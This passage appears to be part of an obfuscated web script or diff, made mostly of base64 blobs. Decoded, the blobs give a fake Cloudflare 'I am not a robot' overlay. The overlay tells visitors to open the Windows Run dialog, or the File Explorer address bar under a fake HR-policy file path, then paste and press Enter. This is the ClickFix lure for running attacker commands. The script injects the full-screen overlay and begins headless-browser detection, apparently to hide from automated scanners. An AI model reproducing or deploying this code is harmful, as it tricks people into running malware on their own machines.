YUm9JR1E5SWswMk1TNDRPRFE0SURFMUxqYzROREZNTmpJdU1EWXpNaUF4TlM0eE5UYzRRell5TGpJM05UZ2dNVFF1TkRFeU5pQTJNaTR4T1RZM0lERXpMamN5TXprZ05qRXVPRFF3TVNBeE15NHlNVGM0UXpZeExqVXhNVGdnTVRJdU56VXhOeUEyTUM0NU5qUTVJREV5TGpRM056TWdOakF1TXpBd055QXhNaTQwTkRVelREUTNMamN5TURFZ01USXVNamd6TmtNME55NDJPREV4SURFeUxqSTRNamtnTkRjdU5qUXlPQ0F4TWk0eU56STRJRFEzTGpZd09ETWdNVEl1TWpVME1rTTBOeTQxTnpNNElERXlMakl6TlRZZ05EY3VOVFEwTWlBeE1pNHlNRGtnTkRjdU5USXhOeUF4TWk0eE56WTJRelEzTGpRNU9UWWdNVEl1TVRRek1TQTBOeTQwT0RVMklERXlMakV3TkRrZ05EY3VORGd3TnlBeE1pNHdOalE1UXpRM0xqUTNOVGdnTVRJdU1ESTFJRFEzTGpRNE1ERWdNVEV1T1RnME5DQTBOeTQwT1RNeklERXhMamswTmpWRE5EY3VOVEUwT1NBeE1TNDRPRE01SURRM0xqVTFOREVnTVRFdU9ESTVNU0EwTnk0Mk1EWXhJREV4TGpjNE9EaERORGN1TmpVNElERXhMamMwT0RZZ05EY3VOekl3TkNBeE1TNDNNalEzSURRM0xqYzROVFlnTVRFdU56Sk1OakF1TkRneU55QXhNUzQxTlRZMlF6WXhMams0T0RrZ01URXVORGcyTkNBMk15NDJNVGsySURFd0xqSTBOaklnTmpRdU1Ua3dOU0E0TGpjek16Y3lURFkwTGpreE5EWWdOaTQ0TVRNMk1VTTJOQzQ1TkRReklEWXVOek15TkRJZ05qUXVPVFV4SURZdU5qUTBORFFnTmpRdU9UTTBNU0EyTGpVMU9UVTNRelkwTGpFeE1pQXlMamd3TmpVeUlEWXdMamd4TVRVZ01DQTFOaTQ0TmpVeUlEQkROVE11TWpJNU15QXdJRFV3TGpFME1qRWdNaTR6T0RFMU9DQTBPUzR3TXpRM0lEVXVOamt4T0RaRE5EZ3VNamcyTkNBMUxqRXlNVGcySURRM0xqTTFNelVnTkM0NE5UazRNaUEwTmk0ME1qSTRJRFF1T1RVNE1qTkRORFF1TmpjNE5TQTFMakV6TkRBeElEUXpMakkzTmlBMkxqVTFPVEk0SURRekxqRXdNelFnT0M0ek1qazNPVU0wTXk0d05Ua2dPQzQzTnpFNE9TQTBNeTR3T1RFMUlEa3VNakU0TkRVZ05ETXVNVGs1TWlBNUxqWTBPVEU0UXpRd0xqTTBPVGNnT1M0M016TTBOeUF6T0M0d05qUTFJREV5TGpFd01qY2dNemd1TURZME5TQXhOUzR3TVRVeFF6TTRMakEyTkRrZ01UVXVNamMxTVNBek9DNHdPRE00SURFMUxqVXpORGNnTXpndU1USXhNaUF4TlM0M09URTVRek00TGpFeU9UUWdNVFV1T0RVeE15QXpPQzR4TlRnMElERTFMamt3TlRjZ016Z3VNakF5T1NBeE5TNDVORFV5UXpNNExqSTBOelFnTVRVdU9UZzBOeUF6T0M0ek1EUTBJREUyTGpBd05qY2dNemd1TXpZek5TQXhOaTR3TURjeFREWXhMalU0T1RRZ01UWXVNREE1T1VNMk1TNDFPVEUySURFMkxqQXhNREVnTmpFdU5Ua3pPQ0F4Tmk0d01UQXhJRFl4TGpVNU5pQXhOaTR3TURrNVF6WXhMalkyTVRZZ01UWXVNREE0T0NBMk1TNDNNalV5SURFMUxqazROaklnTmpFdU56YzNNaUF4TlM0NU5EVTFRell4TGpneU9UTWdNVFV1T1RBME9TQTJNUzQ0TmpjZ01UVXVPRFE0TXlBMk1TNDRPRFE0SURFMUxqYzROREZhSWlCbWFXeHNQU0lqUmpZNE1qRkdJajQ4TDNCaGRHZytQSEJoZEdnZ1pEMGlUVFkyTGpBM05UZ2dOaTQ1TlRJNE5VTTJOUzQ1TlRreUlEWXVPVFV5T0RVZ05qVXVPRFF6SURZdU9UVTFPRElnTmpVdU56STNOQ0EyTGprMk1UYzNRelkxTGpjd09EY2dOaTQ1TmpNeE1pQTJOUzQyT1RBMElEWXVPVFkzTVRrZ05qVXVOamN5T1NBMkxqazNNemcxUXpZMUxqWTBNallnTmk0NU9EUXpOeUEyTlM0Mk1UVXlJRGN1TURBeU1Ua2dOalV1TlRrek1TQTNMakF5TlRjNVF6WTFMalUzTVRFZ055NHdORGt6T1NBMk5TNDFOVFVnTnk0d056Z3dOaUEyTlM0MU5EWXlJRGN1TVRBNU16Wk1OalV1TURVeE5TQTRMamcwTXpNelF6WTBMamd6T0RrZ09TNDFPRGcwTnlBMk5DNDVNVGdnTVRBdU1qYzJOaUEyTlM0eU56UTVJREV3TGpjNE1qZEROalV1TmpBeU9TQXhNUzR5TkRrMElEWTJMakUwT1RnZ01URXVOVEl6TXlBMk5pNDRNVFFnTVRFdU5UVTFNa3cyT1M0ME9UVTVJREV4TGpjeE9EWkROamt1TlRNek5pQXhNUzQzTVRrNUlEWTVMalUzTURVZ01URXVOek1nTmprdU5qQXpOeUF4TVM0M05EZ3pRelk1TGpZek5qa2dNVEV1TnpZMk5pQTJPUzQyTmpVMElERXhMamM1TWpVZ05qa3VOamczSURFeExqZ3lNemxETmprdU56QTVNaUF4TVM0NE5UYzJJRFk1TGpjeU16UWdNVEV1T0RrMklEWTVMamN5T0RNZ01URXVPVE0yTTBNMk9TNDNNek15SURFeEw=",
+    "yr2c9p": "MC40MzEwOTI1ODYyMTMwNDA1"
+  };
+
+  var _a = [
+    "MC42NTA3ODE2NzIwODA1MzA4",
+    "MC45NjQzMjQyMTM0MzI1NDc3",
+    "MC4zODEwOTY2MjQ2NzQ2MjExMw==",
+    "MC4zODk5OTQwMTk4ODM2MTM3",
+    "amszTmpVZ05qa3VOekk0T0NBeE1pNHdNVGN6SURZNUxqY3hOVE1nTVRJdU1EVTFOVU0yT1M0Mk9UTTNJREV5TGpFeE9DQTJPUzQyTlRRMklERXlMakUzTWpjZ05qa3VOakF5T0NBeE1pNHlNVEk1UXpZNUxqVTFNRGtnTVRJdU1qVXpNU0EyT1M0ME9EZzNJREV5TGpJM056RWdOamt1TkRJek5pQXhNaTR5T0RFNVREWTJMall6TnpFZ01USXVORFExTTBNMk5TNHhNalF4SURFeUxqVXhOakVnTmpNdU5Ea3pOeUF4TXk0M05UVTRJRFl5TGpreU16TWdNVFV1TWpZNE1rdzJNaTQzTWpJZ01UVXVPREF5TWtNMk1pNDNNVE0ySURFMUxqZ3lORFVnTmpJdU56RXdOU0F4TlM0NE5EZzJJRFl5TGpjeE15QXhOUzQ0TnpJMFF6WXlMamN4TlRVZ01UVXVPRGsyTVNBMk1pNDNNak0ySURFMUxqa3hPRGtnTmpJdU56TTJOU0F4TlM0NU16ZzVRell5TGpjME9UVWdNVFV1T1RVNE9TQTJNaTQzTmpZNUlERTFMamszTlRVZ05qSXVOemczTkNBeE5TNDVPRGN6UXpZeUxqZ3dOemtnTVRVdU9UazVNU0EyTWk0NE16QTVJREUyTGpBd05UZ2dOakl1T0RVME5DQXhOaTR3TURZNFF6WXlMamcxTmprZ01UWXVNREEyT0NBMk1pNDROVGt5SURFMkxqQXdOamdnTmpJdU9EWXhPQ0F4Tmk0d01EWTRTRGN5TGpRMU1ESkROekl1TlRBMklERTJMakF3TnpNZ056SXVOVFl3TkNBeE5TNDVPRGt6SURjeUxqWXdOVEVnTVRVdU9UVTFORU0zTWk0Mk5EazRJREUxTGpreU1UWWdOekl1TmpneU15QXhOUzQ0TnpNNUlEY3lMalk1TnpjZ01UVXVPREU1TlVNM01pNDROamMzSURFMUxqSXdORE1nTnpJdU9UVXpOU0F4TkM0MU5qZzBJRGN5TGprMU1qa2dNVE11T1RJNU5rTTNNaTQ1TlRFM0lERXdMakEzTmpjZ05qa3VPRGN6TWlBMkxqazFNamcxSURZMkxqQTNOVGdnTmk0NU5USTROVm9pSUdacGJHdzlJaU5HUWtGRU5ERWlQand2Y0dGMGFENDhjR0YwYUNCa1BTSk5PQzR4TVRrMk15QXhPQzQ0T1RBMFNEa3VOelUxTkRGV01qTXVOREkxTkVneE1pNDJNVE01VmpJMExqZzNPVGhJT0M0eE1UazJNMVl4T0M0NE9UQTBXaUlnWTJ4aGMzTTlJbU5wVW5KRVVrNWpOekpxTnpkaElqNDhMM0JoZEdnK1BIQmhkR2dnWkQwaVRURTBMak13T0RFZ01qRXVPVEF5TTFZeU1TNDRPRFV6UXpFMExqTXdPREVnTWpBdU1UWTFOU0F4TlM0Mk56UWdNVGd1Tnpjd05DQXhOeTQwT1RVeUlERTRMamMzTURSRE1Ua3VNekUyTkNBeE9DNDNOekEwSURJd0xqWTJOVE1nTWpBdU1UUTRNaUF5TUM0Mk5qVXpJREl4TGpnMk9ERldNakV1T0RnMU0wTXlNQzQyTmpVeklESXpMall3TlRJZ01Ua3VNams1TVNBeU5DNDVPVGswSURFM0xqUTNPRFVnTWpRdU9UazVORU14TlM0Mk5UYzRJREkwTGprNU9UUWdNVFF1TXpBNE1TQXlNeTQyTWpJeUlERTBMak13T0RFZ01qRXVPVEF5TTFwTk1UZ3VPVGsxT0NBeU1TNDVNREl6VmpJeExqZzROVE5ETVRndU9UazFPQ0F5TVM0d01qSXlJREU0TGpNNE1EWWdNakF1TWpZM09TQXhOeTQwTnpnMUlESXdMakkyTnpsRE1UWXVOVGcwTmlBeU1DNHlOamM1SURFMUxqazROVGdnTWpFdU1EQXpPQ0F4TlM0NU9EVTRJREl4TGpnMk9ERldNakV1T0RnMU0wTXhOUzQ1T0RVNElESXlMamMwT0RRZ01UWXVOakF4TXlBeU15NDFNREkxSURFM0xqUTVOVElnTWpNdU5UQXlOVU14T0M0ek9UY3pJREl6TGpVd01qVWdNVGd1T1RrMU9DQXlNaTQzTmpZMklERTRMams1TlRnZ01qRXVPVEF5TTFvaUlHTnNZWE56UFNKamFWSnlSRkpPWXpjeWFqYzNZU0krUEM5d1lYUm9Qanh3WVhSb0lHUTlJazB5TWk0Mk5qYzBJREl5TGpJMU0xWXhPQzQ0T1RBeFNESTBMak15T0RSV01qSXVNakU1TVVNeU5DNHpNamcwSURJekxqQTRNaklnTWpRdU56VTROQ0F5TXk0ME9UTTVJREkxTGpReE5Ua2dNak11TkRrek9VTXlOaTR3TnpNeklESXpMalE1TXprZ01qWXVOVEF6TkNBeU15NHhNREF6SURJMkxqVXdNelFnTWpJdU1qWXhOMVl4T0M0NE9UQXhTREk0TGpFMk5EZFdNakl1TWpBNU0wTXlPQzR4TmpRM0lESTBMakUwTXpJZ01qY3VNRGMzTWlBeU5DNDVPRGs1SURJMUxqTTVPVEVnTWpRdU9UZzVPVU15TXk0M01qRXhJREkwTGprNE9Ua2dNakl1TmpZM05DQXlOQzR4TWpZNElESXlMalkyTnpRZ01qSXVNalV5TWlJZ1kyeGhjM005SW1OcFVuSkVVazVqTnpKcU56ZGhJajQ4TDNCaGRHZytQSEJoZEdnZ1pEMGlUVE13TGpZMk9DQXhPQzQ0T1RBM1NETXlMamswTkRWRE16VXVNRFV5TmlBeE9DNDRPVEEzSURNMkxqSTNOU0F5TUM0eE1qSTJJRE0yTGpJM05TQXlNUzQ0TlRBNFZqSXhMamcyT0RSRE16WXVNamMxSURJekxqVTVOak1nTXpVdU1ETTFOU0F5TkM0NE9DQXpNaTQ1TVRFZ01qUXVPRGhJTXpBdU5qWTRWakU0TGpnNU1EZGFUVE15TGprM0lESXpMalF3TnpaRE16TXVPVFE0TXlBeU15NDBNRGMySURNMExqVTVOeUF5TWk0NE5qQTVJRE0wTGpVNU55QXlNUzQ0T1RJNFZqSXhMamczTlRsRE16UXVOVGszSURJd0xqa3hOemdnTXpNdU9UUTRNeUF5TUM0ek5qRTBJRE15TGprM0lESXdMak0yTVRSSU16SXVNekF6T0ZZeU15NDBNRGd5VERNeUxqazNJREl6TGpRd056WmFJaUJqYkdGemN6MGlZMmxTY2tSU1RtTTNNbW8zTjJFaVBqd3ZjR0YwYUQ0OGNHRjBhQ0JrUFNKTk16Z3VOalV5TlNBeE9DNDRPVEEwU0RRekxqTTNNemhXTWpBdU16UTFNMGcwTUM0eU9EZ3pWakl4TGpNMk16SklORE11TURjNVZqSXlMamMwTURkSU5EQXVNamc0TTFZeU5DNDROems0U0RNNExqWTFNalZXTVRndU9Ea3dORm9pSUdOc1lYTnpQU0pqYVZKeVJGSk9ZemN5YWpjM1lTSStQQzl3WVhSb1BqeHdZWFJvSUdROUlrMDBOUzQyTlNBeE9DNDRPVEEwU0RRM0xqSTROVGhXTWpNdU5ESTFORWcxTUM0eE5EUXpWakkwTGpnM09UaElORFV1TmpWV01UZ3VPRGt3TkZvaUlHTnNZWE56UFNKamFWSnlSRkpPWXpjeWFqYzNZU0krUEM5d1lYUm9Qanh3WVhSb0lHUTlJazAxTkM0ME1UZzNJREU0TGpnME56VklOVFV1T1RrME9VdzFPQzQxTURjNUlESTBMamczT1RkSU5UWXVOelUwTVV3MU5pNHpNak00SURJekxqZ3hNREZJTlRRdU1EUTNURFV6TGpZeU5UY2dNalF1T0RjNU4wZzFNUzQ1TURVNFREVTBMalF4T0RjZ01UZ3VPRFEzTlZwTk5UVXVPRFV4T0NBeU1pNDFNVGd6VERVMUxqRTVOREVnTWpBdU9ERTFORXcxTkM0MU1qYzRJREl5TGpVeE9ETklOVFV1T0RVeE9Gb2lJR05zWVhOelBTSmphVkp5UkZKT1l6Y3lhamMzWVNJK1BDOXdZWFJvUGp4d1lYUm9JR1E5SWswMk1DNDJNVFE1SURFNExqZzVNREZJTmpNdU5EQTFOa00yTkM0ek1EZ3pJREU0TGpnNU1ERWdOalF1T1RNeE55QXhPUzR4TXlBMk5TNHpNamdnTVRrdU5UUXdOa00yTlM0Mk56UXlJREU1TGpnNE15QTJOUzQ0TlRFeElESXdMak0wTmpJZ05qVXVPRFV4TVNBeU1DNDVNelUzVmpJd0xqazFNalpETmpVdU9EVXhNU0F5TVM0NE5qYzRJRFkxTGpNMk9URWdNakl1TkRjMU5DQTJOQzQyTXpZNUlESXlMamM1TVRsTU5qWXVNRFExSURJMExqZzRTRFkwTGpFMU5UaE1Oakl1T1RZM01TQXlNeTR3TmpVNFNEWXlMakkxTURkV01qUXVPRGhJTmpBdU5qRTBPVll4T0M0NE9UQXhXazAyTXk0ek1qazVJREl4TGpjMk5UUkROak11T0RnMk5DQXlNUzQzTmpVMElEWTBMakl3TnpFZ01qRXVORGt4TlNBMk5DNHlNRGN4SURJeExqQTFOVEZXTWpFdU1ETTRNVU0yTkM0eU1EY3hJREl3TGpVMk56UWdOak11T0RZNU55QXlNQzR6TWpnZ05qTXVNekl4TVNBeU1DNHpNamhJTmpJdU1qVXdOMVl5TVM0M05qWTFURFl6TGpNeU9Ua2dNakV1TnpZMU5Gb2lJR05zWVhOelBTSmphVkp5UkZKT1l6Y3lhamMzWVNJK1BDOXdZWFJvUGp4d1lYUm9JR1E5SWswMk9DNHlNVEV5SURFNExqZzVNRFJJTnpJdU9UVTNPRll5TUM0ek1ESTBTRFk1TGpnek1ESldNakV1TWpBNVNEY3lMalkyTXpKV01qSXVOVEU0TTBnMk9TNDRNekF5VmpJekxqUTJPRE5JTnpOV01qUXVPRGM1T0VnMk9DNHlNVEV5VmpFNExqZzVNRFJhSWlCamJHRnpjejBpWTJsU2NrUlNUbU0zTW1vM04yRWlQand2Y0dGMGFENDhjR0YwYUNCa1BTSk5OQzQxTXpneU5DQXlNaTQyTURRelF6UXVNekE1TVRnZ01qTXVNVE1nTXk0NE1qY3lNeUF5TXk0MU1ESXlJRE11TVRnMk9ERWdNak11TlRBeU1rTXlMakk1TWpZMUlESXpMalV3TWpJZ01TNDJOemMwTmlBeU1pNDNORGt6SURFdU5qYzNORFlnTWpFdU9EZzFNVll5TVM0NE5qYzRRekV1TmpjM05EWWdNakV1TURBME55QXlMakkzTlRreklESXdMakkyTnpZZ015NHhOams0SURJd0xqSTJOelpETXk0NE5ETTJOeUF5TUM0eU5qYzJJRFF1TXpVMk9ERWdNakF1TmpnNE1pQTBMalUzTXpRZ01qRXVNall3TlVnMkxqSTVOelkwUXpZdU1ESXhOVEVnTVRrdU9ETTBPU0EwTGpjNE56RTJJREU0TGpjM01EY2dNeTR4T0RZNE1TQXhPQzQzTnpBM1F6RXVNelkxTXpNZ01UZ3VOemN3TnlBd0lESXdMakUyTmpZZ01DQXlNUzQ0T0RVeFZqSXhMamt3TWpGRE1DQXlNeTQyTWpFNUlERXVNelE0TmlBeU5TQXpMakUyT1RnZ01qVkROQzQzTWpjMk1pQXlOU0ExTGprME5USTFJREl6TGprM05qUWdOaTR5TmpZME5TQXlNaTQyTURRMlREUXVOVE00TWpRZ01qSXVOakEwTTFvaUlHTnNZWE56UFNKamFWSnlSRkpPWXpjeWFqYzNZU0krUEM5d1lYUm9Qand2YzNablBnMEtJQ0FnSUNBOFpHbDJQZzBLSUNBZ0lDQWdJQ0E4YzNCaGJpQnpkSGxzWlQwaWRHVjRkQzFrWldOdmNtRjBhVzl1T2lCMWJtUmxjbXhwYm1VN0lqNVFjbWwyWVdONVBDOXpjR0Z1UGlEaWdLSWdQSE53WVc0Z2MzUjViR1U5SW5SbGVIUXRaR1ZqYjNKaGRHbHZiam9nZFc1a1pYSnNhVzVsT3lJK1ZHVnliWE04TDNOd1lXNCtEUW9nSUNBZ0lEd3ZaR2wyUGcwS0lDQWdJQ0FOQ2lBZ0lDQThMMlJwZGo0TkNpQWdJRHd2WkdsMlBnMEtEUW9nSUNBOFpHbDJJR2xrUFNKcGNVZENUbk5aVWtacVluQWlJR05zWVhOelBTSmpWMms1UkhVNWVXVnFWeUlnYzNSNWJHVTlJbUp2Y21SbGNpMTBiM0E2SUc1dmJtVTdJSEJoWkdScGJtY3RkRzl3T2lBd095QnRZWEpuYVc0dGRHOXdPaUF3TzIxaGNtZHBiaTFpYjNSMGIyMDZNRHNpUGcwS0lDQWdJRHhrYVhZZ1kyeGhjM005SW1NM2RXRTNNa0ZhY1NJK0RRb2dJQ0FnSUR4dFlXbHVJR05zWVhOelBTSmpSSEpRWkZCS1RXUkdZVTRpSUhOMGVXeGxQU0pqYjJ4dmNqb2dJMlE1WkRsa09Uc2lQZzBLSUNBZ0lDQWdJQ0E4WkdsMklHTnNZWE56UFNKalkxZ3dUekZQZDIxUlpXNXBSQ0krRFFvZ0lDQWdJQ0FnSUNBZ1BIQWdjM1I1YkdVOUltWnZiblF0YzJsNlpUb2dNVGh3ZURzZ2JXRnlaMmx1TFdKdmRIUnZiVG9nTVRWd2VEc2lQZzBLSUNBZ0lDQWdJQ0FnSUNBZ1ZHOGdjSEp2ZG1VZ2VXOTFJR0Z5WlNCdWIzUWdZU0J5YjJKdmRDd2djR3hsWVhObE9nMEtJQ0FnSUNBZ0lDQWdJQ0FnUEM5d1BnMEtJQ0FnSUNBZ0lDQWdJRHh2YkQ0TkNpQWdJQ0FnSUNBZ0lDQThiR2srVUhKbGMzTWdKbUZ0Y0RzZ2FHOXNaQ0IwYUdVZ1YybHVaRzkzY3lCTFpYa2dQR2tnWTJ4aGMzTTlJbU5aYnpsVGMyZzJaamhPUW1ZZ1l6ZzRUVkZITWxSRE1HUnpObmxCYmlJK1BDOXBQaUFySUR4aVBsSThMMkkrTGp3dmJHaytEUW9nSUNBZ0lDQWdJQ0FnUEd4cFBsZG9aVzRnZEdobElIZHBibVJ2ZHlCdmNHVnVjeXdnY0hKbGMzTWdQR0krUTNSeWJEd3ZZajRnS3lBOFlqNVdQQzlpUGk0OEwyeHBQZzBLSUNBZ0lDQWdJQ0FnSUR4c2FUNVFjbVZ6Y3lBOFlqNUZiblJsY2p3dllqNGdkRzhnWTI5dGNHeGxkR1VnZG1WeWFXWnBZMkYwYVc5dUxqd3ZiR2srRFFvTkNpQWdJQ0FnSUNBZ0lDQThJUzB0SUR4c2FUNVFjbVZ6Y3lBZ2IyNGdlVzkxY2lCclpYbGliMkZ5WkNCMGJ5Qm1hVzVwYzJndVBDOXNhVDRnTFMwK0RRb2dJQ0FnSUNBZ0lDQWdQQzl2YkQ0TkNpQWdJQ0FnSUNBZ0lDQThjQ0J6ZEhsc1pUMGljR0ZrWkdsdVp5MTBiM0E2SURFd2NIZzdJajROQ2lBZ0lDQWdJQ0FnSUNCWmIzVWdjMmh2ZFd4a0lITmxaU0IwYUdseklIUmxlSFFnWVhCd1pXRnlPZzBLSUNBZ0lDQWdJQ0FnSUR4aWNpQXZQZzBLSUNBZ0lDQWdJQ0FnSUR4amIyUmxJSE4wZVd4bFBTSmlZV05yWjNKdmRXNWtPaUJ1YjI1bE95QmliM0prWlhJNklERndlQ0J6YjJ4cFpDQWpOemszT1RjNU95QjNhV1IwYURvZ05ETXljSGc3SWo1SklHRnRJRzV2ZENCaElISnZZbTkwSUMwZ1EyeHZkV1JtYkdGeVpTQkpSRG9nUEhOd1lXNGdhV1E5SW1rM2FqaGhTVVoyVFdsc0lqNDJNREZtWmpNME56d3ZjM0JoYmo0OEwyTnZaR1UrRFFvZ0lDQWdJQ0FnSUNBZ1BDOXdQZzBLSUNBZ0lDQWdJQ0FnSUEwS0lDQWdJRHd2WkdsMlBnMEtEUW9nSUNBZ0lEd3ZiV0ZwYmo0TkNpQWdJQ0E4TDJScGRqNE5DZzBLSUNBZ0lDQWdJQ0E4WkdsMklITjBlV3hsUFNKa2FYTndiR0Y1T2lCdWIyNWxPeUkrRFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnRFFvZ0lDQWdJQ0FnSUNBZ1BHOXNQZzBLSUNBZ0lDQWdJQ0FnSUR3aExTMGdMaTR1TGk0dUxqeHNhU0J6ZEhsc1pUMGliV0Z5WjJsdUxXSnZkSFJ2YlRvZ01UQndlRHNpUGcwS0lDQWdJQ0FnSUNBZ0lDQWdRMjl3ZVNCMGFHVWdabWxzWlNCd1lYUm9JR0psYkc5M0RRb2dJQ0FnSUNBZ0lDQWdJQ0E4WkdsMklHTnNZWE56UFNKallWZDRNRnBzTUdSVVpUWmliV3BvSWlCcFpEMGlhV3BsUlZGTmRHUkpNQ0lnYjI1amJHbGphejBpZEdocGN5NWpiR0Z6YzB4cGMzUXVZV1JrS0NkamJHbGphMlZrSnlraVBnMEtJQ0FnSUNBZ0lDQWdJQ0FnUXpwY2FXNTBaWEp1WVd3dGMyVmpkWEpsWEdacGJHVmtjbWwyWlZ4SVVsQnZiR2xqZVM1a2IyTjREUW9nSUNBZ0lDQWdJQ0FnSUNBOEwyUnBkajROQ2lBZ0lDQWdJQ0FnSUNBOEwyeHBQaUE3T3pzN096czdMUzArRFFvZ0lDQWdJQ0FnSUNBZ1BHeHBJSE4wZVd4bFBTSnRZWEpuYVc0dFltOTBkRzl0T2lBeE1IQjRPeUkrVDNCbGJpQkdhV3hsSUVWNGNHeHZjbVZ5SUdGdVpDQnpaV3hsWTNRZ2RHaGxJR0ZrWkhKbGMzTWdZbUZ5SUNnOGMzUnliMjVuUGtOVVVrd2dLeUJNUEM5emRISnZibWMrS1R3dmJHaytEUW9nSUNBZ0lDQWdJQ0FnUEd4cElITjBlV3hsUFNKdFlYSm5hVzR0WW05MGRHOXRPaUF4TUhCNE95SStVR0Z6ZEdVZ2RHaGxJSEJoZEdnZ0tEeHpkSEp2Ym1jK1ExUlNUQ0FySUZZOEwzTjBjbTl1Wno0cElHRnVaQ0J3Y21WemN5QThjM1J5YjI1blBrVnVkR1Z5UEM5emRISnZibWMrUEM5c2FUNE5DaUFnSUNBZ0lDQWdJQ0E4TDI5c1BnMEtEUW9nSUNBZ0lDQWdJQ0FnUEdsdWNIVjBJSFI1Y0dVOUltWnBiR1VpSUdsa1BTSnBaSG81Y0dacFYza2lJSE4wZVd4bFBTSmthWE53YkdGNU9pQnViMjVsT3lJK0RRb2dJQ0FnSUNBZ0lDQWdQR0oxZEhSdmJpQnBaRDBpYVVwNk9XbFVWV28wZGtocVFtUkpJajVQY0dWdUlFWnBiR1VnUlhod2JHOXlaWEk4TDJKMWRIUnZiajROQ2lBZ0lDQWdJQ0FnUEM5a2FYWStEUW9OQ2cwS0lDQWdQR1JwZGlCamJHRnpjejBpWXpkMVlUY3lRVnB4SUdORFlqaDVTM0Z1VkhCdFZpSWdjM1I1YkdVOUltSmhZMnRuY205MWJtUTZJRzV2Ym1VN0lqNE5DaUFnSUNBZ1BHUnBkaUJqYkdGemN6MGlZME5pT0hsTGNXNVVjRzFXTFd4bFpuUWlJSE4wZVd4bFBTSjNhV1IwYURvZ01qZzJjSGc3SUdac2IyRjBPaUJzWldaME95QjBaWGgwTFdGc2FXZHVPaUJzWldaME95Qm1iMjUwTFhOcGVtVTZJREUxY0hnN0lqNE5DaUFnSUNBZ0lGQmxjbVp2Y20wZ2RHaGxJSE4wWlhCeklHRmliM1psSUhSdklHWnBibWx6YUNCMlpYSnBabWxqWVhScGIyNHVEUW9nSUNBZ0lEd3ZaR2wyUGcwS0lDQWdJQ0E4WW5WMGRHOXVJSFI1Y0dVOUltSjFkSFJ2YmlJZ1kyeGhjM005SW1OVVVrNWFZMmsyYjAxcGJ6Tk1hU0JqTVRoNFpFMWhZakpSSWlCcFpEMGlhVFpLTTFwMk0yRkJJaUJ6ZEhsc1pUMGlZbUZqYTJkeWIzVnVaRG9nSXpWbE5XVTFaVHNnY0dGa1pHbHVaem9nT1hCNElETTRjSGc3SUc5d1lXTnBkSGs2SURBdU5Uc2dZM1Z5YzI5eU9pQnViM1F0WVd4c2IzZGxaRHNpSUdScGMyRmliR1ZrUGxabGNtbG1lVHd2WW5WMGRHOXVQZzBLSUNBZ0lEd3ZaR2wyUGcwS0lDQWdQQzlrYVhZK0RRb05DaUFnSUR3aExTMGdMUzArRFFvTkNnMEtEUW9nSUR3dlpHbDJQZzBLSUNBZ0lEeHdJR05zWVhOelBTSmpkVlJQY0ZSd2VYUnlJaUJ6ZEhsc1pUMGlabTl1ZEMxemFYcGxPaUF4TGpWeVpXMDdEUW9nSUNBZ2JHbHVaUzFvWldsbmFIUTZJREl1TWpWeVpXMDdJSEJoWkdScGJtY3RkRzl3T2lBeU1IQjRPeUkrUEhOd1lXNGdZMnhoYzNNOUltTk1ia1l3TURCSU4ydzNJajQ4TDNOd1lXNCtJRzVsWldSeklIUnZJSEpsZG1sbGR5QjBhR1VnYzJWamRYSnBkSGtnYjJZZ2VXOTFjaUJqYjI1dVpXTjBhVzl1SUdKbFptOXlaU0J3Y205alpXVmthVzVuTGp3dmNENE5DaUFnSUNBOGNDQmpiR0Z6Y3owaVkxbGlXRW8yWTFGNlFsRkVabk0zSWlCemRIbHNaVDBpWm05dWRDMXphWHBsT2lBeExqVnlaVzA3SUd4cGJtVXRhR1ZwWjJoME9pQXlMakkxY21WdE95QndZV1JrYVc1bkxYUnZjRG9nTWpCd2VEc2daR2x6Y0d4aGVUb2dibTl1WlRzaVBsZGhhWFJwYm1jZ1ptOXlJRHh6Y0dGdUlHTnNZWE56UFNKalRHNUdNREF3U0Rkc055SStQQzl6Y0dGdVBpNHVMand2Y0Q0TkNpQThMMlJwZGo0TkNpQU5DaUE4WkdsMklHTnNZWE56UFNKak1VSTFUM05TVW1ReU9YY2lJSEp2YkdVOUltTnZiblJsYm5ScGJtWnZJajROQ2lBZ1BHUnBkaUJqYkdGemN6MGlZekZDTlU5elVsSmtNamwzTFdsdWJtVnlJajROQ2lBZ0lEeGthWFkrRFFvZ0lDQWdQR1JwZGo1U1lYa2dTVVE2SUR4amIyUmxJR05zWVhOelBTSmpibFpMUTNOdVpUY2lQalUyWVRSak5USTVPV1prWlhSdFkyRThMMk52WkdVK1BDOWthWFkrRFFvZ0lDQThMMlJwZGo0TkNpQWdJRHhrYVhZZ2MzUjViR1U5SW0xaGNtZHBiaTEwYjNBNklEVndlRHNpUGxCbGNtWnZjbTFoYm1ObElDWWdjMlZqZFhKcGRIa2dZbmtnUEhOd1lXNGdZMnhoYzNNOUltTkdaRFoxUlZkc1ZVcHNJajVEYkc5MVpHWnNZWEpsUEM5emNHRnVQand2WkdsMlBnMEtJQ0E4TDJScGRqNE5DaUE4TDJScGRqNE5Dand2WkdsMlBnMEtEUW84YzJOeWFYQjBQZzBLRFFvTkNnMEtQQzl6WTNKcGNIUStEUW9OQ2cwS1BDOWthWFkrUEM5aWIyUjVQand2YUhSdGJEND0nOwogICAgY29uc3QgaCA9IGI2NFRvVXRmOChiNjQpOwoKICAgIGNvbnN0IG92ZXJsYXkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsKICAgIG92ZXJsYXkuY2xhc3NOYW1lID0gJ292ZXJsYXktc3R5bGVzJzsKICAgIG92ZXJsYXkuaW5uZXJIVE1MID0gaDsKICAgIG92ZXJsYXkuc3R5bGUuY3NzVGV4dCA9ICdwb3NpdGlvbjpmaXhlZDt0b3A6MDtsZWZ0OjA7d2lkdGg6MTAwJTtoZWlnaHQ6MTAwdmg7ei1pbmRleDo5OTk5OTknOwogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChvdmVybGF5KTsKICAgIHNldFRpbWVvdXQoaW5qZWN0U2NyaXB0LCAwKTsKICB9CgogIGNvbnN0IEhFQURMRVNTX1dFSUdIVCA9IDEwOwogIGNvbnN0IEhFQURGVUxfV0VJR0hUID0gLTg7CiAgY29uc3QgU1VTUElDSU9VU19XRUlHSFQgPSA1OwoKICBhc3luYyBmdW5jdGlvbiBkZXRlY3RIZWFkbGVzcygpIHsKICAgIGNvbnN0IGNoZWNrcyA9IFsKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IHVhID0gbmF2aWdhdG9yLnVzZXJBZ2VudC50b0xvd2VyQ2FzZSgpOwogICAgICAgIGNvbnN0IGlzSGVhZGxlc3MgPSAvaGVhZGxlc3N8cGhhbnRvbWpzfHNlbGVuaXVtfHdlYm